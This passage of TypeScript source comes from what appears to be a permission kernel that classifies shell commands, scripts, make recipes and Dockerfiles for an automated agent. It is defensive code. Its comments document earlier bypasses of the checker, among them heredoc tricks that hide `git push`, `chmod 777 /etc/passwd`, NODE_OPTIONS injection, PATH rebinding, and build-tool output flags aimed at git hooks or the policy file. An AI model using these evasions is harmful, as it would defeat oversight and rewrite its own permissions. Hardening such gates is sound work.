      let j = i + 2;
      out += "$'";
      while (j < line.length) {
        if (line[j] === '\\' && j + 1 < line.length) {
          out += line[j]! + line[j + 1]!;
          j += 2;
          continue;
        }
        if (line[j] === "'") break;
        out += line[j]!;
        j++;
      }
      out += "'";
      i = j;
      continue;
    }
    if (ch === "'" || ch === '"') quote = ch;
    // THE SAME WORD BOUNDARY THE SPLITTER USES. This reader kept the narrow `/\s/` test after the splitter's was
    // widened, so `;#`, `&&#`, `|#` and `)#` comments were never stripped from a SCRIPT line or a HOOK body. A
    // line reading `echo a;#<<true` then opened a phantom heredoc named `true` that swallowed the `git push` on
    // the next line — in a plain `bash ./x.sh`, and in `.git/hooks/pre-commit`, which turns an ordinary
    // `git commit` into a remote push (exit review 7). A fix that lands at one of two readers of the same rule is
    // the meta-defect this repository has met before; both readers now share the class.
    else if (ch === '#' && (i === 0 || /[\s;&|()]/.test(line[i - 1]!))) break;
    out += ch;
  }
  return out;
}

/** `$[ … ]` is the OLD arithmetic form, still accepted by bash: its `<<` is a left shift, exactly as inside
 *  `$(( … ))`. Leaving it alone let `echo $[1<<true]` open a heredoc whose delimiter never arrived, so every
 *  remaining line of the script was read as its body (exit review 8). */
const OLD_ARITH_RE = /\$\[[^\]]*\]/g;

/** The heredoc delimiter a line opens, or null. A `<<` only opens one when it is UNQUOTED, is not the `<<<`
 *  herestring, and is not the left-shift operator inside an arithmetic expansion. Matching `<<` anywhere on the
 *  line made `grep -rn "<<<<<<< HEAD" .`, `echo "shift << Bits"`, `cat <<< ready` and `echo $((1<<BITS))` open a
 *  heredoc whose delimiter never arrives — so every REMAINING line of the script, hook or recipe was skipped as
 *  though it were data, and a `git push` or a `chmod 777 /etc/passwd` below it was never classified at all
 *  (exit review 4). */
function heredocDelimiter(line: string): string | null {
  // `$[ … ]` and `$(( … ))` both hold ARITHMETIC, where `<<` is a left shift. Blanking the old form here is what
  // keeps `echo $[1<<true]` from opening a heredoc whose delimiter never arrives (exit review 8).
  line = line.replace(OLD_ARITH_RE, '$ARITH');
  let quote: string | null = null;
  for (let i = 0; i < line.length; i++) {
    const c = line[i]!;
    if (c === '\\') {
      i++;
      continue;
    }
    if (quote) {
      if (c === quote) quote = null;
      continue;
    }
    if (c === "'" || c === '"') {
      quote = c;
      continue;
    }
    // an arithmetic expansion is where `<<` is a left shift, not a redirection
    if (c === '$' && line[i + 1] === '(' && line[i + 2] === '(') {
      let depth = 0;
      let j = i + 1;
      for (; j < line.length; j++) {
        if (line[j] === '(') depth++;
        else if (line[j] === ')' && --depth === 0) break;
      }
      i = j;
      continue;
    }
    if (c === '<' && line[i + 1] === '<') {
      if (line[i + 2] === '<') {
        i += 2; // `<<<` is a herestring: it carries DATA, and opens nothing
        continue;
      }
      const m = /^<<-?\s*(?:'([^']*)'|"([^"]*)"|([A-Za-z_][A-Za-z0-9_]*))/.exec(line.slice(i));
      if (m) return m[1] ?? m[2] ?? m[3] ?? null;
      i++;
    }
  }
  return null;
}

/** Splits shell script text into classifiable segments, returning null when the script is opaque (dynamic commands). */
function scriptSegments(text: string): string[] | null {
  // PRODUCER CONTRACT: resolve WHICH lines execute, and hand every one of them over verbatim. Nothing is dropped
  // for looking harmless — that judgement belongs to the canonical analyzer, which classifies shell structure as
  // read-only itself. A heredoc BODY is data the script feeds to a command, not commands, so it is not emitted as
  // executable text; `eval` and a `$`-headed command cannot be resolved at all and are reported as UNKNOWN.
  const out: string[] = [];
  let heredoc: string | null = null;
  let heredocQuoted = false;
  let heredocOpener = '';
  let heredocBody = '';
  // A BACKSLASH-NEWLINE IS ERASED BEFORE THE SHELL SEES THE COMMAND. Splitting on the raw newline first cut
  // `git \` + newline + `push origin main` into two unclassifiable fragments, so an absolute core deny reached
  // ASK from inside a script while the same continuation typed directly was denied (exit review 4).
  for (const raw of text.replace(/\\\r?\n[ \t]*/g, ' ').split(/\r?\n/)) {
    if (heredoc !== null) {
      if (raw.trim() !== heredoc) {
        heredocBody += raw + '\n';
        continue;
      }
      // the body is over: hand over whatever the SHELL would run out of it — the whole body when the reader takes
      // its program from stdin, the substitutions when the delimiter was unquoted, nothing when it was quoted
      // a script is read LINE BY LINE here, so the splitter's `case` state does not persist across lines and a
      // branch's `a)` is still glued to the opener; it is structure either way, and stripped before the role test
      const openerCommand = (sg: string): string => emitterTail(sg.replace(/^\(?\s*[^\s()|;&]+\s*\)\s+(?=\S)/, ''));
      if (splitShellSegments(heredocOpener).some((sg) => readsScriptFromStdin(openerCommand(sg)))) {
        const nested = scriptSegments(heredocBody);
        if (nested === null) return null; // the carried script is opaque, so this one is too
        out.push(...nested);
      }
      else if (!heredocQuoted) out.push(...substitutionsIn(heredocBody));
      heredoc = null;
      heredocBody = '';
      continue;
    }
    const line = stripComment(raw).trim();
    if (!line || line.startsWith('#!')) continue;
    heredoc = heredocDelimiter(line);
    if (heredoc !== null) {
      heredocOpener = line;
      heredocQuoted = new RegExp(`<<-?\\s*(?:'${heredoc}'|"${heredoc}"|\\\\${heredoc})(?!\\w)`).test(line);
    }
    // an `eval` or a command built from a variable cannot be resolved: report UNKNOWN rather than guess
    for (const seg of splitShellSegments(line)) {
      for (const n of normalizeSegment(seg)) {
        const head = /^(\S+)/.exec(n)?.[1] ?? '';
        if (head === 'eval' || /^["']?\$/.test(head)) return null;
      }
    }
    // THE BODY HAS ALREADY BEEN REMOVED HERE, so the opener's `<<DELIM` must go with it. Leaving it in handed the
    // canonical splitter a heredoc whose delimiter can never arrive, and it consumed every remaining line of the
    // script as that body — a script with any heredoc hid everything below it, at ALLOW (exit review 4).
    out.push(heredoc === null ? line : line.replace(/<<-?\s*(?:'[^']*'|"[^"]*"|\\?[A-Za-z_][A-Za-z0-9_]*)/g, '').trim());
  }
  // A HEREDOC THAT NEVER CLOSES MEANS THE SCRIPT WAS MISREAD: everything after it was skipped as data, so the set
  // of commands resolved here is not the set that will run. Report opacity rather than a short list.
  if (heredoc !== null) return null;
  return out;
}

/** True when the path exists on disk AND is a directory. A3: an invocation directory that is not there cannot be
 *  the proven base of a relative resolution. */
function directoryExists(abs: string): boolean {
  try {
    return statSync(abs).isDirectory();
  } catch {
    return false;
  }
}

/** Destination operands of the write-ish commands, resolved against `cwd`. Feeds the A4 freshness ledger so that
 *  `cp evil.mk Makefile && make build` can no longer be judged from the Makefile that was replaced. */
const LEDGER_ANY = '\0any';
function writtenPathOperands(segment: string, cwd: string): string[] {
  const tokens = tokenize(withoutRedirections(segment));
  const hi = commandHeadIndex(tokens);
  const head = tokens[hi] ?? '';
  const operands = tokens.slice(hi + 1).filter((t) => !t.startsWith('-') && !t.includes('='));
  const out: string[] = [];
  const abs = (t: string): string => (isAbsolute(t) ? t : resolve(cwd, t));
  // A WRITE THIS LEDGER CANNOT ENUMERATE is a wildcard, and pretending otherwise is how a makefile replaced by `cp
  // evil/* .` looked untouched: a glob or bracket in an operand of a writer, `find … -exec`, `xargs` running a writer,
  // and the tools that name an output file as an OPERAND (exit review 10, self-attack)
  if (
    /^(cp|mv|install|ginstall|rsync|ln|tee|touch|truncate|scp|ditto)$/.test(head) &&
    tokens.slice(hi + 1).some((t) => !t.startsWith('-') && /[*?[{]/.test(t))
  )
    return [LEDGER_ANY];
  if (head === 'find' && tokens.some((t) => /^-(exec|execdir|ok|okdir|fprint|fprint0|fprintf|fls|delete)$/.test(t))) return [LEDGER_ANY];
  if (head === 'xargs' && tokens.slice(hi + 1).some((t) => /^(cp|mv|tee|install|ln|rsync|sed|dd|truncate|touch|curl|wget|tar|unzip|sh|bash|zsh|perl|python3?|node|ruby)$/.test(t))) return [LEDGER_ANY];
  if (head === 'sort') {
    for (const [i, t] of tokens.entries()) {
      if (t === '-o' && tokens[i + 1]) out.push(abs(tokens[i + 1]!));
      else if (t.startsWith('--output=')) out.push(abs(t.slice(9)));
      else if (/^-o./.test(t)) out.push(abs(t.slice(2)));
    }
    return out;
  }
  if (head === 'uniq' && operands.length >= 2) return [abs(operands[1]!)];
  if (head === 'curl') {
    for (const [i, t] of tokens.entries()) {
      if ((t === '-o' || t === '--output') && tokens[i + 1]) out.push(abs(tokens[i + 1]!));
      else if (t.startsWith('--output=')) out.push(abs(t.slice(9)));
      else if (t === '-O' || t === '--remote-name' || t === '--remote-name-all' || t === '--output-dir') return [LEDGER_ANY];
    }
    return out;
  }
  if (head === 'wget') {
    for (const [i, t] of tokens.entries()) {
      if ((t === '-O' || t === '--output-document') && tokens[i + 1]) out.push(abs(tokens[i + 1]!));
      else if (t.startsWith('--output-document=')) out.push(abs(t.slice(18)));
      else if (t === '-P' || t === '--directory-prefix' || t === '-r' || t === '--recursive') return [LEDGER_ANY];
    }
    return out.length ? out : [LEDGER_ANY];
  }
  if (head === 'git' && /^(checkout|restore|clone)$/.test(operands[0] ?? '')) {
    // `--` IS OPTIONAL, AND GIT SAYS SO. `git checkout HEAD~1 control-plane/permissions/matchers.md` overwrites
    // that file from an arbitrary tree-ish exactly as the `--` spelling does, and `git checkout origin/evil
    // .harness` replaces the whole governance tree; only the dash-dash form was read, so the plain one was ALLOW
    // while the identical act with two extra characters was an absolute deny (exit review 7). Without `--`, the
    // first operand may be a tree-ish and everything after it is a pathspec; `git clone URL DIR` writes DIR.
    const dd = tokens.indexOf('--');
    if (dd >= 0) out.push(...tokens.slice(dd + 1).map(abs));
    else if (operands[0] === 'clone') {
      const dir = operands.slice(1).filter((t) => !/^[a-z+]+:\/\/|@.*:|^git@/.test(t))[1];
      if (dir) out.push(abs(dir));
    } else {
      // `git checkout .` and `git checkout src/` name a pathspec directly; with a tree-ish in front, the rest do
      const rest = operands.slice(1);
      const treeish = rest.length > 1 && !/[/.]/.test(rest[0]!) ? 1 : 0;
      out.push(...rest.slice(treeish).map(abs));
    }
  } else if (/^(cp|mv|install|ginstall|rsync|ln)$/.test(head) && tokens.some((t) => t === '-t' || t.startsWith('--target-directory'))) {
    // `-t DIR SRC…` writes DIR/basename(SRC); the LAST operand is a source, not the destination
    const ti = tokens.findIndex((t) => t === '-t' || t.startsWith('--target-directory'));
    const dirArg = tokens[ti]!.includes('=') ? tokens[ti]!.slice(tokens[ti]!.indexOf('=') + 1) : tokens[ti + 1];
    if (dirArg) {
      const dir = abs(dirArg);
      out.push(dir);
      for (const src of operands.filter((o) => o !== dirArg)) out.push(`${dir}/${src.slice(src.lastIndexOf('/') + 1)}`);
    }
  } else if (/^(cp|mv|install|ginstall|rsync|ln)$/.test(head) && operands.length >= 2) {
    // `cp SRC DIR` WRITES `DIR/basename(SRC)`, not DIR. The ledger recorded the destination operand verbatim,
    // so `cp evil/Makefile sub && make -C sub all` marked `sub` written and left `sub/Makefile` — the file the
    // next command reads — looking fresh (exit review 10). When the destination is an existing DIRECTORY, every
    // source contributes the name it lands under.
    const last = abs(operands[operands.length - 1]!);
    out.push(last);
    if (directoryExists(last))
      for (const src of operands.slice(0, -1))
        out.push(`${last}/${src.slice(src.lastIndexOf('/') + 1)}`);
    // A HARD LINK IS A SECOND NAME FOR THE SAME INODE. `cp -l control-plane/permissions/absolute-denies.md
    // /tmp/alias` makes the governed file writable through a path no rule covers, and the same is true of
    // `ln` without `-s`. The SOURCE is therefore part of the act, which is why it is added to the ledger here
    // (exit review 7).
    if ((head === 'ln' && !tokens.includes('-s')) || (head === 'cp' && tokens.some((t) => /^-[a-zA-Z]*l/.test(t))))
      out.push(...operands.slice(0, -1).map(abs));
  }
  else if (/^(tee|truncate|touch)$/.test(head))
    // a device sink is a DISCARD, exactly as it is for `> /dev/null`, which redirectionTargets already knows;
    // `ls | tee /dev/null` was classified as an outside-workspace write (exit review 5)
    out.push(...operands.filter((t) => !isDeviceDiscard(t)).map(abs));
  else if (head === 'dd') {
    const of = tokens.find((t) => t.startsWith('of='));
    if (of) out.push(abs(of.slice(3)));
  } else if (/^(sed|gsed|perl|ruby|gawk)$/.test(head) && tokens.some((t) => /^-[a-z]*i/.test(t) || t === '--in-place') && operands.length)
    out.push(...operands.slice(1).map(abs));
  // A BUILD TOOL'S OUTPUT FLAG IS A WRITE DESTINATION. Every bundler, compiler and archiver names where it writes
  // with a flag, and none of them were read: `esbuild src/a.ts --outfile=.git/hooks/pre-commit` installed a git
  // hook, `--outfile=control-plane/permissions/matchers.md` rewrote the policy that decides every later verdict,
  // and `--outfile=.harness/runtime/pin.json` wrote runtime state the kernel alone may write — all at ALLOW,
  // while the same bytes through `cp` or `>` were absolute denies (exit review 7). The flag names the file
  // whatever the tool is, so the rule is about the FLAG, not about an enumerated list of tools.
  for (const [i, t] of tokens.entries()) {
    const eq = OUTPUT_FLAG_RE.exec(t);
    if (eq?.[1]) out.push(abs(eq[1]));
    else if (eq && tokens[i + 1] && !tokens[i + 1]!.startsWith('-')) out.push(abs(tokens[i + 1]!));
    // buildx writes to the host with `--output type=local,dest=PATH` (and `-o` with the same value shape)
    const bx = /(?:^|,)dest=([^,\s]+)/.exec(t);
    if (bx?.[1]) out.push(abs(bx[1]));
  }
  return out;
}

/** The flags with which a tool names the file or directory it WRITES. `-o` is deliberately absent: it is `grep -o`,
 *  `git blame -o` and `ps -o` far more often than it is an output file, and the tools where it means a destination
 *  (`go build -o`, `curl -o`) are matched by their own rules. */
const OUTPUT_FLAG_RE =
  /^(?:--(?:outfile|out-file|out-dir|outdir|output-dir|output-directory|output-path|output-file|output|dist-dir|dest|destination|emit-to|out)|--file|-D|--directory)(?:=(.*))?$/;

/** True when a segment writes an UNENUMERABLE set of files: an archive extraction, or a recursive copy whose
 *  destination is a directory. The per-path ledger cannot express either, and `tar -xf p.tar -C sub && make -C sub
 *  build` was judged from a Makefile the extraction may have just replaced. */
function writesUnenumerably(segment: string): boolean {
  const tokens = tokenize(segment);
  const head = tokens[0] ?? '';
  if (/^(tar|bsdtar|gtar|pax)$/.test(head))
    return tokens.some((t) => /^-{0,2}[a-zA-Z-]*x/.test(t) && !t.startsWith('--exclude'));
  if (/^(unzip|7z|7za|unrar|bsdcpio|cpio)$/.test(head)) return true;
  if (/^(rsync|cp)$/.test(head) && tokens.some((t) => /^-[a-zA-Z]*[ra]/.test(t))) return true;
  if (head === 'git' && tokens.includes('checkout-index')) return true;
  return false;
}

/** True when the path exists on disk, whatever our ability to read it. */
function fileExists(abs: string): boolean {
  try {
    statSync(abs);
    return true;
  } catch {
    return false;
  }
}

/* ------------------------------------------------------------------------------------------------------------- *
 * RESOLUTION OUTCOME — "positive security claims must be earned" (product decision, 2026-09-22).
 *
 * A parser failing to find something is NOT proof that it does not exist. "NOT ANALYZED" and "PROVEN ABSENT" are
 * different states, and only one of them may keep a declared class's ALLOW. Before this type there was a single
 * boolean-ish `missing | unread`, and every gap between a producer's grammar and the real tool landed in the
 * friendly half: an unparsed make construct read exactly like a target that does not exist, so the analyzer's own
 * blind spot was routed into the one state that fails OPEN.
 * ------------------------------------------------------------------------------------------------------------- */

export type ResolutionOutcome =
  /** everything that will execute was located, read and handed over */
  | 'RESOLVED_COMPLETE'
  /** PROVEN that nothing will execute — the source was fully read and genuinely does not define this target */
  | 'ABSENT_VERIFIED'
  /** part of what will execute was resolved; the rest was not */
  | 'PARTIAL'
  /** the source uses constructs this resolver does not model */
  | 'UNSUPPORTED'
  /** the source exists but could not be read */
  | 'UNREADABLE'
  /** the target, path or command is built at runtime */
  | 'DYNAMIC'
  /** resolved correctly, but the source may have been rewritten before the effect executes */
  | 'STALE'
  /** the execution context the conclusion depends on was not proven */
  | 'CONTEXT_UNVERIFIED'
  /** an implicit producer attached to repository state (git hooks, dependency install scripts) was not resolved */
  | 'AMBIENT_UNRESOLVED'
  /** PROVEN: this head introduces no executable closure beyond what its arguments name (authored vocabulary) */
  | 'NOT_A_PRODUCER'
  /** this head DISCOVERS and executes content EGO has not been shown — test files, a config and its plugins,
   *  another package's scripts — and EGO does not model that closure. The silence of a producer lookup table is
   *  not proof that nothing else runs (challenge 7, UNCLAIMED-HEAD CLOSURE). */
  | 'UNKNOWN_PRODUCER';

/**
 * INFORMATION MONOTONICITY. Less verified information must never produce a more permissive verdict, so the two
 * states that carry a positive claim are named here ONCE and every other state — including any added later —
 * falls to the opaque side by construction. `analyzeBody` is independent: a PARTIAL resolution still hands over
 * what it did resolve, and the unresolved remainder is reported separately rather than swallowing the rest.
 */
export function resolutionEffect(outcome: ResolutionOutcome): { proven: boolean; opaque: boolean } {
  switch (outcome) {
    case 'RESOLVED_COMPLETE':
    case 'ABSENT_VERIFIED':
    case 'NOT_A_PRODUCER':
      return { proven: true, opaque: false };
    default:
      return { proven: false, opaque: true };
  }
}

/** How much verified information an outcome carries. Used by the monotonicity property test; never by policy. */
export const INFORMATION_RANK: Record<ResolutionOutcome, number> = {
  RESOLVED_COMPLETE: 2,
  ABSENT_VERIFIED: 2,
  PARTIAL: 1,
  STALE: 1,
  UNSUPPORTED: 0,
  UNREADABLE: 0,
  DYNAMIC: 0,
  CONTEXT_UNVERIFIED: 0,
  AMBIENT_UNRESOLVED: 0,
  NOT_A_PRODUCER: 2,
  UNKNOWN_PRODUCER: 0,
};

/** A cheap content fingerprint, so a resolution can be invalidated when its source changes (freshness, A4). */
function fingerprint(text: string): string {
  let h1 = 0x811c9dc5;
  let h2 = 0x01000193;
  for (let i = 0; i < text.length; i++) {
    h1 = Math.imul(h1 ^ text.charCodeAt(i), 0x01000193);
    h2 = Math.imul(h2 + text.charCodeAt(i), 0x85ebca6b) ^ (h2 >>> 13);
  }
  return ((h1 >>> 0).toString(16) + (h2 >>> 0).toString(16)).padStart(16, '0');
}

/** A manifest we could not read: UNREADABLE when it is there, ABSENT_VERIFIED when it provably is not. */
function manifestUnresolved(
  ctx: EvaluationContext,
  abs: string | null,
  key: string,
  what: string,
): ProducerResult {
  const exists = abs !== null && fileExists(abs);
  return {
    kind: 'npm-script',
    key,
    body: null,
    reason: exists ? `${what} present but not readable` : `no ${what}`,
    resolution: exists ? 'UNREADABLE' : 'ABSENT_VERIFIED',
  };
}

/** THE PRODUCER CONTRACT (product decision, 2026-09-22 — "security true by construction").
 *
 *  A producer — make, a package script, a shell script, an ambient producer, and any producer added later — MAY:
 *    - resolve WHICH bodies will execute, explicit and ambient;
 *    - resolve the execution context those bodies run in;
 *    - report how COMPLETE, FRESH and PROVEN that resolution is (`resolution`);
 *    - provide structured provenance and a fingerprint for what it inspected;
 *    - report inability to resolve.
 *
 *  A producer MAY NOT:
 *    - emit ALLOW/ASK/DENY, or decide a body is safe;
 *    - discard executable content before canonical analysis;
 *    - map its own parser failure to a friendly absence without proof;
 *    - weaken a nested effect, or hide analysis truncation.
 *
 *  Enforced structurally rather than by convention: this type has NO field that can carry a verdict, a capability
 *  or a hit, and `resolution` is REQUIRED — a producer cannot omit its completeness state, and every value except
 *  the two proven ones is opacity. `packages/kernel/test/producer-contract.test.ts` pins the rest. */
export interface ProducerResult {
  /** TYPED DISPATCH. `none` means NO REGISTERED PRODUCER CLAIMS THIS HEAD — a structural fact about the producer
   *  table, not a claim about what will execute. It is the only honest use of "nothing here", and it is decided by
   *  a table lookup rather than by a producer giving up. A producer that DOES claim the head must return a
   *  resolution state; it may not fall back to an untyped `null` channel that silently meant ABSENT_VERIFIED
   *  (challenge 6, finding 28). */
  kind: 'shell-script' | 'npm-script' | 'make-target' | 'git-ambient' | 'none';
  /** True when this producer's bodies run INSIDE a container image, so their paths are the image's. */
  containerPaths?: boolean;
  /** execution IDENTITY for the cycle guard: everything that makes this a distinct execution — the directory, the
   *  makefile or manifest actually read, and the target. A bare name collided across directories and across
   *  `-f other.mk` (challenge 4, findings 20, 34). */
  key: string;
  /** what was inspected to reach this conclusion, and its fingerprint, so a stale resolution can be detected */
  provenance?: { source: string; fingerprint: string };
  /** the VERBATIM executable units. A producer may not filter, simplify or drop any of it. */
  body: string[] | null;
  reason: string;
  /** The execution context the BODY's relative operands resolve against. `make -C sub` runs its recipe in `sub`;
   *  an npm script runs in the manifest's directory; a shell script runs in the caller's directory. */
  bodyEnv?: ExecutionEnvironment;
  /** SCOPED OPACITY: exactly which parts of the execution closure are unresolved. A PARTIAL result says what is
   *  missing rather than declaring the whole operation unknown. */
  unresolved?: Unresolved[];
  /** How complete/fresh/proven this resolution is. REQUIRED: only RESOLVED_COMPLETE and ABSENT_VERIFIED carry a
   *  positive claim; everything else is opacity at every depth. */
  resolution: ResolutionOutcome;
  /** true when the body is ONE shell (a script) rather than independent shells (make recipe lines, npm pre/post) */
  oneShell?: boolean;
}

/* ---------------------------------------------- GNU make subset ---------------------------------------------- */

interface MakeRule {
  recipes: string[];
  prereqs: string[];
}
interface MakeFileModel {
  rules: Map<string, MakeRule>;
  firstTarget: string | null;
  defaultGoal: string | null;
  /** EVERY goal any branch of the file could select. `.DEFAULT_GOAL` may be assigned inside a conditional, and
   *  which branch runs depends on the environment — so all of them are candidates, exactly as `altVars` treats
   *  a variable assigned in several branches (exit review 9). */
  altGoals: Set<string>;
  /** OPTIONAL INCLUDES THAT WERE NOT THERE. `-include gen.mk` is skipped when the file is missing — which is why
   *  it exists — but "missing" is a claim about NOW, and an earlier unit of the same command may have just
   *  written it. The producer checks these against the freshness ledger (exit review 9). */
  pendingIncludes: string[];
  oneShell: boolean;
  /** constructs that affect the WHOLE file, so no conclusion drawn from it is complete ($(eval), VPATH, an
   *  include this resolver could not read or whose path is computed) */
  unsupported: string[];
  /** constructs that affect ONLY the targets defined under them, chiefly conditionals. Attributing these to the
   *  whole file made one `ifeq` or one `%.o:` rule gate every unrelated target — a proportionality break, not a
   *  security property (challenge 6, findings 22 and 27). */
  unsupportedFor: Map<string, string[]>;
  /** true when the file has pattern rules, which can build a target no literal rule defines: it bears only on
   *  whether ABSENCE can be proven, never on a target whose own recipe was read */
  hasPatternRules: boolean;
  /** `target: VAR = value` — make's TARGET-SPECIFIC variable, which overrides the global one for that target's
   *  recipes and for everything it is a prerequisite of. */
  targetVars: Map<string, Map<string, string>>;
  /** the names assigned with `override`, whose makefile value WINS over a command-line assignment. */
  overridden: Set<string>;
  /** Every value a name is given inside a CONDITIONAL. The resolver cannot always evaluate the condition, so
   *  each branch's value is a candidate and the recipe is expanded with each of them. */
  altVars: Map<string, Set<string>>;
  /** `export NAME := value` — the names the makefile puts in EVERY recipe's environment. `export PGHOST :=
   *  prod-db.acme.com` makes the recipe's `psql` connect to production, and `export NODE_OPTIONS :=
   *  --require=./evil.js` makes every Node tool in every recipe load that file; the recipe text says neither
   *  (exit review 8). */
  exported: Map<string, string>;
  /** `%.o: %.c` — an IMPLICIT rule, which builds a target no literal rule names. Recording only the FLAG that
   *  the file has some made every pattern-built prerequisite an opacity; keeping the rules lets the one that
   *  matches be resolved like any other recipe (exit review 7). */
  patternRules: Array<{ target: string; prereqs: string[]; recipes: string[] }>;
  /** CONFIGURATION CLOSURE + BINDING: assignments that change WHICH PROGRAM a recipe line runs, rather than what
   *  the line says. `SHELL := ./bin/badsh` and `export PATH := ./bin:$(PATH)` both make every command in every
   *  recipe mean something else, while the recipe text stays honest (challenge 6, findings 18, 24). */
  rebinds: string[];
  /** every variable this resolver could read, so a recipe's `$(VAR)` is substituted with the VALUE make will
   *  splice in rather than guessed at. A value carrying `;`, `&&` or `|` really does become new commands — the
   *  shell's own `$VAR` is not re-parsed for operators, and importing that reasoning into make was false. */
  vars: Map<string, string>;
  /** commands make RUNS WHILE PARSING — every `$(shell …)` outside a recipe. They run for any target, and for
   *  `make -n`, so they belong to the body of whatever was asked for (exit review 4). */
  parseRan: string[];
  sources: string[];
  text: string;
}

/** True when a SHELL / .SHELLFLAGS / PATH assignment names the ordinary thing rather than re-pointing execution:
 *  a system shell at a standard absolute path, ordinary shell flags, or a PATH that only APPENDS system
 *  directories. Anything relative, anything inside the repository, and anything built from a variable is a
 *  rebinding. */
function isOrdinaryShellAssignment(name: string, value: string): boolean {
  const v = value.trim().replace(/\s*#.*$/, '');
  if (name === 'SHELL')
    return /^\/(bin|usr\/bin|usr\/local\/bin)\/(sh|bash|zsh|dash|ksh|ash)$/.test(v) || /^(sh|bash|zsh|dash|ksh)$/.test(v);
  if (name === '.SHELLFLAGS') return /^-[a-zA-Z]+(\s+-[a-zA-Z]+)*$/.test(v);
  // PATH: ordinary only when every NEW entry is an absolute system directory
  // AN EMPTY ENTRY IN PATH IS THE CURRENT DIRECTORY. `export PATH := :$(PATH)` puts the checkout first, so every
  // bare program name the recipe uses resolves to a repository file — and filtering empties away made the list
  // of NEW entries empty, which `every` calls ordinary (exit review 8).
  const parts = v.replace(/\$[({]?PATH[)}]?/g, '\0').split(':');
  if (parts.some((q, i) => q.trim() === '' && !(parts.length > 1 && i === parts.length - 1 && v.trimEnd().endsWith('\0'))))
    return false;
  const added = parts.filter((p) => p.trim().length > 0 && p.trim() !== '\0');
  // ...AND AN ENTRY IS JUDGED ON WHAT IT RESOLVES TO. `/usr/../tmp/evilbin` begins with `/usr` and IS `/tmp`,
  // so a writable directory anyone can plant a `cc` in was read as a system directory (exit review 7).
  return added.every((p) => {
    const t = p.trim();
    return /^\/(usr|opt|bin|sbin|Library|System)\b/.test(t) && /^\/(usr|opt|bin|sbin|Library|System)\b/.test(resolve(t));
  });
}

/** Images whose ENTRYPOINT is a tool this kernel models, so the container's argv IS that tool's command line.
 *  Deliberately a short, named list: the argv of an arbitrary image is not a command line, and guessing would
 *  gate every `docker run myapp --port 8080`. */
/** docker's MANAGEMENT GROUPS: `docker container run` is `docker run`, `docker image build` is `docker build`.
 *  Every verb has both spellings, so a rule anchored on `tokens[1]` sees only half of them. */
const DOCKER_GROUPS = /^(container|image|manifest|compose|buildx|builder|volume|network|system|context|plugin|node|secret|config|swarm|stack|service|trust)$/;

const CLI_IMAGES: ReadonlyArray<readonly [RegExp, string]> = [
  [/(^|\/)(amazon\/aws-cli|aws-cli\/aws-cli)$/i, 'aws'],
  [/(^|\/)hashicorp\/vault$/i, 'vault'],
  [/(^|\/)hashicorp\/terraform$/i, 'terraform'],
  [/(^|\/)(google\/cloud-sdk|cloudsdktool\/[a-z-]+)$/i, 'gcloud'],
  [/(^|\/)(azure-cli|azuresdk\/azure-cli-python)$/i, 'az'],
  [/(^|\/)(bitnami\/kubectl|rancher\/kubectl|lachlanevenson\/k8s-kubectl)$/i, 'kubectl'],
  [/(^|\/)(alpine\/helm|dtzar\/helm-kubectl)$/i, 'helm'],
];
/** An image REFERENCE without its registry-agnostic decorations: the tag or digest is stripped, so
 *  `docker.io/amazon/aws-cli@sha256:…` and `amazon/aws-cli:2.15` are the same image as `amazon/aws-cli`.
 *  Anchoring the patterns to the bare name was a way to spell the image that the rule did not recognise. */
function imageName(ref: string): string {
  return ref.replace(/@sha256:[0-9a-f]+$/i, '').replace(/:[^/:]+$/, '');
}
/** docker/podman run options that consume the next token, so their value is not the image name. */
const DOCKER_RUN_VALUE_OPTS =
  /^(-e|--env|--env-file|-v|--volume|--mount|-p|--publish|--name|-w|--workdir|-u|--user|--entrypoint|--network|--net|--add-host|--label|-l|--log-driver|--log-opt|--restart|--memory|-m|--cpus|--cpu-shares|--device|--dns|--hostname|-h|--platform|--pull|--health-cmd|--security-opt|--cap-add|--cap-drop|--tmpfs|--ulimit|--sysctl|--shm-size|--pid|--ipc|--uts|--userns|--cgroupns|--runtime|--attach|-a|--detach-keys|--stop-signal|--stop-timeout|--storage-opt|--volumes-from|--link|--expose|--gpus)$/;

/** docker/buildx build options that consume the next token, so their value is not the build context. */
const DOCKER_BUILD_VALUE_OPTS =
  /^(-f|--file|-t|--tag|--build-arg|--label|--target|--platform|--cache-from|--cache-to|--output|-o|--secret|--ssh|--network|--add-host|--progress|--builder|--iidfile|--metadata-file|--attest|--provenance|--sbom|--allow|--ulimit|--shm-size|--cpu-shares|--memory|--isolation)$/;

/** The lines of a Dockerfile that `docker build` EXECUTES: every `RUN`, and nothing else. `CMD` and `ENTRYPOINT`
 *  are metadata recorded in the image and run at `docker run`, not at build time — analysing them gated every
 *  ordinary Node Dockerfile on its own `CMD ["node","dist/index.js"]`. A JSON-array form (`RUN ["a","b"]`) is an
 *  exec without a shell, so its argv is joined into one command line rather than parsed as shell. Continuations
 *  are joined first, because a `RUN` line may span many physical lines. */
function dockerfileShellLines(text: string): string[] {
  // `# escape=<char>` CHANGES THE LINE-CONTINUATION CHARACTER for the whole file — a documented directive whose
  // usual use is a backtick on Windows. It is read BEFORE comment lines are dropped, because it is one of them,
  // and joining only backslash-newline left the continued half of a RUN as its own line (exit review 8).
  const esc = /^\s*#\s*escape\s*=\s*(\S)/im.exec(text)?.[1];
  if (esc && esc !== '\\') text = text.split(esc + '\n').join(' ');
  // A COMMENT LINE IS REMOVED BEFORE CONTINUATIONS ARE JOINED. Docker strips comment lines first, so a trailing
  // backslash in a comment joins NOTHING — but this reader joined continuations first, so `# helper \` swallowed
  // the `RUN` beneath it and that line became invisible (exit review 8). The `# syntax=` directive is kept,
  // because it is the one comment that changes what the file MEANS.
  text = text
    .split('\n')
    .filter((l) => !/^\s*#/.test(l) || /^\s*#\s*syntax\s*=/i.test(l))
    .join('\n');
  // `RUN <<EOF … EOF` is BuildKit's heredoc form: the body is the script the shell runs, exactly as it is for
  // `bash <<EOF` (exit review 8, self-attack).
  // ...INCLUDING BuildKit's interpreter form, `RUN sh <<EOF`, which is how the documentation writes it. The
  // rewrite matched only the bare `RUN <<DELIM`, so the body of every `RUN sh <<EOF` stayed invisible
  // (exit review 8).
  text = text.replace(
    /^[ \t]*(?:ONBUILD[ \t]+)?RUN[ \t]+(?:--\S+[ \t]+)*(?:[^\s<]+[ \t]+)*<<-?["']?(\w+)["']?[^\n]*\n([\s\S]*?)\n[ \t]*\1[ \t]*$/gim,
    (_m, _d: string, body: string) => body.split('\n').map((l) => `RUN ${l}`).join('\n'),
  );
